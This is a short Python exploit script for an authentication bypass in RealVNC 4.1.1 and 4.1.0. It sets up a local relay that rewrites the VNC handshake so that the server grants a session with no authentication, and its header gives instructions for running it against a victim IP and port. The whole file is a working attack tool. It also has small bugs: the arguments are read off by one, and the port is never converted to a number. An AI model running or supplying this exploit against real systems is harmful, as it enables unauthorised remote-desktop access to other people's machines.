#!/bin/bash/python

# RealVNC 4.1.1 or 4.1.0 authentication bypass
# Written by Andrew Lewis
# Imitates auxiliary/admin/vnc/realvnc_41_bypass metasploit module

# Instructions:
# 1. Run this script, realvnc.py <victim_ip> <victim_port>
# 2. Run vncviewer 127.0.0.1

import socket
import thread
import sys

def forward (source, destination):
	string = ' '
	while string:
		string = source.recv(1024)
		if string:
			destination.sendall(string)


#connect to remote realvnc 4.1.1 or 4.1.0
host = sys.argv[0] 
port = sys.argv[1]
remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
remote.connect((host, port))

#create local vnc relay/mitm server
local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local.bind(('localhost', 5900)) # run 'vncviewer 127.0.0.1' in another window
local.listen(5)

while True:
	(client, address) = local.accept()
	#client.settimeout(3)
	
	#fetch remote header from remote
	serverhello = remote.recv(1024)
	print "server hello: " + repr(serverhello)

	#fetch helloresponse from client 
	client.send(serverhello)
	helloresponse = client.recv(1024)
	print "hello response: " + repr(helloresponse)

	#fetch "security types supported" from remote
	remote.send(helloresponse)
	securitytypes = remote.recv(1024)
	bypasstypes = '\x01\x01'
	print "security types: " + repr(securitytypes) + " forcing to 01 01 if not already"

	#fetch "auth type selected by client" from client
	client.send(bypasstypes)
	selectedauth = client.recv(1024)
	bypassauth = '\x01'
	print "selected auth type: " + repr(selectedauth) + " forcing auth type to 01 if not already"

	
	#fetch auth result from remote
	remote.send(bypassauth)
	authresult = remote.recv(1024)
	print "auth result: " + repr(authresult)
	
	#send flag \x01
	client.send(authresult)
	
	#begin normal vnc session
	thread.start_new_thread(forward, (client, remote))
	thread.start_new_thread(forward, (remote, client))
